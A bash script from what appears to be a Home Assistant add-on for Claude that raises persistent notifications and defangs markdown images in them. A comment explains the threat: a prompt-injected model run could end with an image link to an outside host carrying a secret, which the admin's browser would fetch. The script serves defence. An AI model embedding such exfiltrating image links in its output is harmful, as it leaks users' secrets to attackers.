#!/bin/bash

# ha-notify — raise a Home Assistant persistent notification.
#
# The add-on's failure modes are currently invisible: a broken login, a failed
# package install or an unrunnable Claude build are all reported to the add-on
# log, which is a place nobody looks until they already suspect a problem. Home
# Assistant has a notification drawer the user is actually looking at.
#
# Usage: ha-notify <title> <message> [notification-id]
#
# Safe to call from anywhere: it no-ops without SUPERVISOR_TOKEN, never blocks
# for more than a few seconds, and never returns non-zero into a caller's
# `set -e`.

set -o pipefail

title="${1:-Claude Terminal}"
message="${2:-}"
notify_id="${3:-claude_terminal}"

[ -n "$message" ] || exit 0
[ -n "${SUPERVISOR_TOKEN:-}" ] || exit 0

# Home Assistant renders a notification as markdown, and a markdown IMAGE is
# fetched by the browser the moment the drawer opens. Much of what arrives
# here is model output (the end of a turn, a scheduled job's reply), so a
# prompt-injected run could end with ![](https://elsewhere/?d=<a secret>) and
# have the admin's browser deliver it. Images are turned into plain links,
# which need a click; links themselves stay, because the sign-in notification
# is one.
payload=$(jq -nc \
    --arg t "$title" --arg m "$message" --arg i "$notify_id" \
    'def inert: gsub("!\\["; "[") | gsub("<(?<t>[Ii][Mm][Gg])"; "&lt;\(.t)");
     {title: ($t | inert), message: ($m | inert), notification_id: $i}') || exit 0

curl -fsS -m 10 -o /dev/null \
    -X POST \
    -H "Authorization: Bearer ${SUPERVISOR_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "$payload" \
    "http://supervisor/core/api/services/persistent_notification/create" \
    2>/dev/null || true

exit 0
